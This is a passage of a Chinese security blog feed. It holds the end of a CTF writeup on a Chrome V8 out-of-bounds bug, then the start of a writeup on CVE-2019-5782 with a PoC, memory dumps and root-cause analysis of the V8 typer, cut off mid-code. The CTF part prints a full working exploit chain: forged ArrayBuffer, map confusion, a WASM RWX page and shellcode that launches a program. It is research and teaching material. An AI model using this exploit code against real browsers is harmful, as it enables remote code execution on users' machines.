0xFFFF;</span><br><span class="line">        c16 +&#x3D; a16 + b16;</span><br><span class="line">        c32 +&#x3D; c16 &gt;&gt;&gt; 16;</span><br><span class="line">        c16 &amp;&#x3D; 0xFFFF;</span><br><span class="line">        c32 +&#x3D; a32 + b32;</span><br><span class="line">        c48 +&#x3D; c32 &gt;&gt;&gt; 16;</span><br><span class="line">        c32 &amp;&#x3D; 0xFFFF;</span><br><span class="line">        c48 +&#x3D; a48 + b48;</span><br><span class="line">        c48 &amp;&#x3D; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        return new _u64((c48 &lt;&lt; 16) | c32, (c16 &lt;&lt; 16) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        return this.add(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        return this.sub(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        return new _u64(~this.hi_, ~this.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        return this.not().add(new _u64(0,1));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        return this.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        return ((val &amp; 0xFF) &lt;&lt; 24) | ((val &amp; 0xFF00) &lt;&lt; 8) |</span><br><span class="line">              ((val &gt;&gt; 8) &amp; 0xFF00) | ((val &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        var lo &#x3D; swap32(this.lo_);</span><br><span class="line">        var hi &#x3D; swap32(this.hi_);</span><br><span class="line">        return new _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">var u64 &#x3D; function(hi, lo) &#123; return new _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line">function gc()&#123;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; 1024 * 1024 * 16; i++)&#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasm_code &#x3D; new Uint8Array([</span><br><span class="line">    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,</span><br><span class="line">    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,</span><br><span class="line">    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,</span><br><span class="line">    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x41, 0x00, 0x0b</span><br><span class="line">  ]);</span><br><span class="line">  const wasm_instance &#x3D; new WebAssembly.Instance(</span><br><span class="line">    new WebAssembly.Module(wasm_code));</span><br><span class="line">  const wasm_func &#x3D; wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line">var shellcode&#x3D;[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">var fake_arraybuffer &#x3D; [</span><br><span class="line">    &#x2F;&#x2F;map|properties</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;elements|length</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1000).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;backingstore|0x2</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x2).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;padding</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    &#x2F;&#x2F;fake map</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1900042319080808).asDouble(),</span><br><span class="line">    new Int64(0x00000000082003ff).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">].splice(0);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; %DebugPrint(fake_arraybuffer);</span><br><span class="line"></span><br><span class="line">var ab &#x3D; new ArrayBuffer(0x1000);</span><br><span class="line">var a &#x3D; [1.1, 1.1, 1.1, 1.1,1.1];</span><br><span class="line">var b &#x3D; [fake_arraybuffer, wasm_instance, ab, 2.2, 2.2];</span><br><span class="line">var c &#x3D; [3.3, 3.3, 3.3, 3.3, 3.3];</span><br><span class="line">&#x2F;&#x2F;布局内存，让array连续存放</span><br><span class="line">a &#x3D; a.splice(0);</span><br><span class="line">b &#x3D; b.splice(0);</span><br><span class="line">c &#x3D; c.splice(0);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; leak出double&#x2F;object array的map</span><br><span class="line">&#x2F;&#x2F; print(&quot;0x&quot; + Int64.fromDouble(a.oob()).toString(16));</span><br><span class="line">&#x2F;&#x2F; print(new Int64(Int64.fromDouble(a.oob())).asDouble());</span><br><span class="line">double_map &#x3D; a.oob();</span><br><span class="line">console.log(&quot;doube map is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(double_map).toString(16));</span><br><span class="line">console.log(&quot;object map is:&quot;);</span><br><span class="line">object_map &#x3D; b.oob();</span><br><span class="line">console.log(Int64.fromDouble(object_map).toString(16));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;覆盖object array的map为double,于是可以通过b来leak</span><br><span class="line">b.oob(double_map);</span><br><span class="line"></span><br><span class="line">fake_arraybuffer_obj &#x3D; b[0];</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_obj).toString(16));</span><br><span class="line">&#x2F;&#x2F; %DebugPrint(fake_arraybuffer);</span><br><span class="line">fake_arraybuffer_elem &#x3D; fake_arraybuffer_obj + new Int64(0xc70).asDouble();&#x2F;&#x2F;这个偏移需要适配</span><br><span class="line">console.log(&quot;fake_arraybuffer addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_elem).toString(16));</span><br><span class="line">console.log(&quot;fake_arraybuffer map is:&quot;);</span><br><span class="line">fake_arraybuffer_map &#x3D; fake_arraybuffer_elem + new Int64(0x40).asDouble();</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_map).toString(16));</span><br><span class="line">fake_arraybuffer[0] &#x3D; fake_arraybuffer_map;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; %DebugPrint(wasm_instance);</span><br><span class="line">console.log(&quot;wasm_instance is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(b[1]).toString(16));</span><br><span class="line">locate_rwx_addr &#x3D; b[1] + new Int64(0x88 - 0x1).asDouble();</span><br><span class="line">fake_arraybuffer[4] &#x3D; locate_rwx_addr;</span><br><span class="line"></span><br><span class="line">var d &#x3D; [fake_arraybuffer_elem, 1.1, 1.1];</span><br><span class="line">d.oob(object_map);</span><br><span class="line">var dv &#x3D; new DataView(d[0]);</span><br><span class="line">console.log(&quot;fake_arraybuffer done&quot;);</span><br><span class="line">&#x2F;&#x2F; %DebugPrint(dv);</span><br><span class="line">rwx_addr &#x3D; dv.getFloat64(0, true);</span><br><span class="line">console.log(&quot;rwx addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(rwx_addr).toString(16));</span><br><span class="line">fake_arraybuffer[4] &#x3D; rwx_addr;</span><br><span class="line">for (i &#x3D; 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    dv.setUint32(i * 4, shellcode[i], true);</span><br><span class="line">&#125;</span><br><span class="line">wasm_func();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>测试机器ubuntu16.04<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;star-ctf-chrome-oob-writeup&quot;&gt;&lt;a href=&quot;#star-ctf-chrome-oob-writeup&quot; class=&quot;headerlink&quot; title=&quot;star ctf chrome oob writeup&quot;&gt;&lt;/a&gt;star 
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-5782:Inappropriate implementation in V8 漏洞利用</title>
    <link href="http://eternalsakura13.com/2018/11/28/bug-906043/"/>
    <id>http://eternalsakura13.com/2018/11/28/bug-906043/</id>
    <published>2018-11-28T02:35:20.063Z</published>
    <updated>2019-07-24T13:55:46.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></li><li><a href="https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js</a></li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Flags: --allow-natives-syntax</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;  <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line">a3.length = <span class="number">0x11000</span>;</span><br><span class="line">a3.fill(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) fun(...a4);</span><br><span class="line"><span class="comment">// %OptimizeFunctionOnNextCall(fun);</span></span><br><span class="line">fun(...a3);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a2.length; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a2[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a2.length);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">a1:</span><br><span class="line">DebugPrint: <span class="number">0x358226e9b891</span>: [JSArray]</span><br><span class="line"> - length: <span class="number">16</span></span><br><span class="line"> - elements: <span class="number">0x358226e9b801</span> &lt;FixedDoubleArray[<span class="number">16</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">        <span class="number">1</span><span class="number">-15</span>: <span class="xml"><span class="tag">&lt;<span class="name">the_hole</span>&gt;</span></span></span><br><span class="line"><span class="xml"> &#125;</span></span><br><span class="line"><span class="xml">a2:</span></span><br><span class="line"><span class="xml">DebugPrint: 0x358226e9b941: [JSArray]</span></span><br><span class="line"><span class="xml"> - length: 42</span></span><br><span class="line"> - elements: 0x358226e9b8b1 &lt;FixedDoubleArray[65535]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">        1-15: &lt;the_hole&gt;</span><br><span class="line">          16: 2.90681e-310</span><br><span class="line">          17: 2.90688e-310</span><br><span class="line">          18: 2.90674e-310</span><br><span class="line">          19: 8.91238e-313</span><br><span class="line">    20-51430: -1.18859e+148</span><br><span class="line"></span><br><span class="line">a1 elements:</span><br><span class="line">lldb) x/50gx 0x358226e9b801-1</span><br><span class="line">0x358226e9b800: 0x00003582ced81461 0x0000001000000000</span><br><span class="line">0x358226e9b810: 0x3ff199999999999a-&gt;a1[0] 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b820: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b830: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b840: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b850: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b860: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b870: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b880: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">a1 object:</span><br><span class="line">0x358226e9b890: 0x0000358279782f29 0x00003582ced80c29</span><br><span class="line">0x358226e9b8a0: 0x0000358226e9b801 0x0000001000000000</span><br><span class="line">a2 elements:</span><br><span class="line">0x358226e9b8b0: 0x00003582ced81461 0x0000ffff00000000-&gt;a1[21]</span><br><span class="line">0x358226e9b8c0: 0x3ff199999999999a 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8d0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8e0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8f0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b900: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b910: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b920: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b930: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">a2 object:</span><br><span class="line">0x358226e9b940: 0x0000358279782f29 0x00003582ced80c29</span><br><span class="line">0x358226e9b950: 0x0000358226e9b8b1 0x0000002a00000000-&gt;a1[41]</span><br><span class="line">0x358226e9b960: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">0x358226e9b970: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">0x358226e9b980: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line"></span><br><span class="line">function fun(arg) &#123;</span><br><span class="line">    let x = arguments.length;// x = 65536，但范围分析认为是65534</span><br><span class="line">    a1 = new Array(0x10);</span><br><span class="line">    a1[0] = 1.1;</span><br><span class="line">    a2 = new Array(0x10);</span><br><span class="line">    a2[0] = 1.1;</span><br><span class="line">    x = x &gt;&gt; 16;// x = 65536&gt;&gt;16 = 1,但范围分析认为是65534&gt;&gt;16 = 0</span><br><span class="line">    a1[x * 21] = 1.39064994160909e-309;  // 0xffff00000000</span><br><span class="line">    a1[x * 41] = 8.91238232205e-313;  // 0x2a00000000  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞验证，边界检查被移除后的越界读写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1.1</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">3.5906059781413e-311</span><br><span class="line">3.592134784647e-311</span><br><span class="line">3.5918890420468e-311</span><br><span class="line">8.91238232205e-313</span><br><span class="line">3.5921347865955e-311</span><br><span class="line">8.487983164e-314</span><br><span class="line">4.243991582e-314</span><br><span class="line">0</span><br><span class="line">3.5906059883793e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.5921347865955e-311</span><br><span class="line">1.4853970537e-313</span><br><span class="line">1.0609978955e-313</span><br><span class="line">0</span><br><span class="line">3.590605972767e-311</span><br><span class="line">3.5906059725297e-311</span><br><span class="line">3.5906059886165e-311</span><br><span class="line">3.590605982569e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783793e-311</span><br><span class="line">1.1</span><br><span class="line">3.592134783793e-311</span><br><span class="line">3.5906059781413e-311</span><br><span class="line">3.592134783793e-311</span><br><span class="line">42</span><br></pre></td></tr></table></figure><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>在typer phase里对SpeculativeNumberShiftRight的range进行计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #55:JSCreateArray)</span><br><span class="line">    102: LoadField[tagged base, 24, #length, NonInternal, kRepTagged|kTypeAny, FullWriteBarrier](9, 101, 18)</span><br><span class="line">    27: NumberConstant[16]</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-12-03-034318.png" alt=""><br>由于在typer phase还不会对Load处理，于是在第一次对NumberShiftRight进行range analysis的时候，会将其范围直接当做int32的最大和最小值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#   define INT32_MIN       ((int32_t)(-2147483647-1))</span><br><span class="line">#   define INT32_MAX       ((int32_t)(2147483647))</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberShiftRight</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToUint32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> min_lhs = lhs.Min();</span><br><span class="line">  <span class="keyword">int32_t</span> max_lhs = lhs.Max();</span><br><span class="line">  <span class="keyword">uint32_t</span> min_rhs = rhs.Min();</span><br><span class="line">  <span class="keyword">uint32_t</span> max_rhs = rhs.Max();</span><br><span class="line">  <span class="keyword">if</span> (max_rhs &gt; <span class="number">31</span>) &#123;</span><br><span class="line">    <span class="comment">// rhs can be larger than the bitmask</span></span><br><span class="line">    max_rhs = <span class="number">31</span>;</span><br><span class="line">    min_rhs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">min</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(min_lhs &gt;&gt; min_rhs, min_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">max</span>(max_lhs &gt;&gt; min_rhs, max_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"min lhs is %d\n"</span>, min_lhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"min rhs is %d\n"</span>, min_rhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"max lhs is %d\n"</span>, max_lhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"max rhs is %d\n"</span>, max_rhs);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">max</span> == kMaxInt &amp;&amp; <span class="built_in">min</span> == kMinInt) <span class="keyword">return</span> Type::Signed32();</span><br><span class="line">  <span class="keyword">return</span> Type::Range(<span class="built_in">min</span>, <span class="built_in">max</span>, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是在第一次对NumberShiftRight进行range analysis之后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">min lhs is -2147483648</span><br><span class="line">min rhs is 16</span><br><span class="line">max lhs is 2147483647</span><br><span class="line">max rhs is 16</span><br><span class="line">...</span><br><span class="line">[Type: Range(-32768, 32767)]</span><br></pre></td></tr></table></figure><p>然后在typer lowering phase里将JSCreateArray reduce成ArgumentsLength,并计算其范围。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">JSCreateLowering::ReduceJSCreateArguments</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(IrOpcode::kJSCreateArguments, node-&gt;opcode());</span><br><span class="line">  CreateArgumentsType type = CreateArgumentsTypeOf(node-&gt;op());</span><br><span class="line">  Node* <span class="keyword">const</span> frame_state = NodeProperties::GetFrameStateInput(node);</span><br><span class="line">  Node* <span class="keyword">const</span> outer_state = frame_state-&gt;InputAt(kFrameStateOuterStateInput);</span><br><span class="line">  Node* <span class="keyword">const</span> control = graph()-&gt;start();</span><br><span class="line">  FrameStateInfo state_info = FrameStateInfoOf(frame_state-&gt;op());</span><br><span class="line">  <span class="function">SharedFunctionInfoRef <span class="title">shared</span><span class="params">(broker(),</span></span></span><br><span class="line"><span class="function"><span class="params">                               state_info.shared_info().ToHandleChecked())</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the ArgumentsAccessStub for materializing both mapped and unmapped</span></span><br><span class="line">  <span class="comment">// arguments object, but only for non-inlined (i.e. outermost) frames.</span></span><br><span class="line">  <span class="keyword">if</span> (outer_state-&gt;opcode() != IrOpcode::kFrameState) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">      <span class="keyword">case</span> CreateArgumentsType::kMappedArguments: &#123;</span><br><span class="line">        <span class="comment">// TODO(mstarzinger): Duplicate parameters are not handled yet.</span></span><br><span class="line">        <span class="keyword">if</span> (shared.has_duplicate_parameters()) <span class="keyword">return</span> NoChange();</span><br><span class="line">        Node* <span class="keyword">const</span> callee = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">        Node* <span class="keyword">const</span> context = NodeProperties::GetContextInput(node);</span><br><span class="line">        Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">        Node* <span class="keyword">const</span> arguments_frame =</span><br><span class="line">            